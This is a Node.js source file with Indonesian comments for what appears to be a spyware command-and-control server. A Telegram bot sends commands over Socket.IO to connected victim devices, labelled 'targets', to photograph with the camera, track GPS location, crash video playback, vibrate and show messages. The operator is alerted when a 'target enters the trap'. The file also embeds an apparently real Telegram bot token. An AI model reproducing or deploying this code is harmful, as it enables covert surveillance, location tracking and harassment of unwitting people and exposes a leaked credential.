const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"] 
    } 
});

// === ⚡ KONFIGURASI MASTER ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; // GANTI DENGAN TOKEN BOT TUAN
const bot = new Telegraf(BOT_TOKEN);
const MY_ID = '7373392803'; 

// UI Menu v15.0 (Anti-Error HTML Mode)
const mainMenu = async (ctx) => {
    const text = `<b>⚡ FIONZY CLOUD PANEL v15.0 ⚡</b>\n` +
                 `--------------------------------------\n` +
                 `🌐 <b>Server:</b> RENDER (USA)\n` +
                 `🔋 <b>HP Tuan:</b> HEMAT 100%\n` +
                 `--------------------------------------\n` +
                 `<i>Pilih eksekusi target:</i>`;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
        [Markup.button.callback('💀 Crash Video', 'crash'), Markup.button.callback('📳 Vibrate', 'vibrate')],
        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
    ]);

    try {
        await ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) { ctx.reply("PANEL CLOUD READY", keyboard); }
};

// Notifikasi Target Online ke Telegram Tuan
io.on('connection', (socket) => {
    console.log('⚡ Target Terkoneksi ke Cloud!');
    bot.telegram.sendMessage(MY_ID, "⚠️ <b>TARGET MASUK PERANGKAP!</b>\nSistem Cloud FionzyGpt aktif.", { parse_mode: 'HTML' }).catch(() => {});
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Perintah Socket
bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Memotret...').catch(() => {}); io.emit('command', '/snap'); });
bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak...').catch(() => {}); io.emit('command', '/gps'); });
bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Eksekusi Devil Video!').catch(() => {}); io.emit('command', '/crash'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: /toast [pesan]"));

bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Pesan Terkirim via Cloud!");
    }
});

// Port Otomatis untuk Render
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`⚡ FIONZY CLOUD LIVE ON PORT ${PORT}`);
});

bot.launch().then(() => console.log('⚡ BOT TELEGRAM CLOUD SIAP!'));
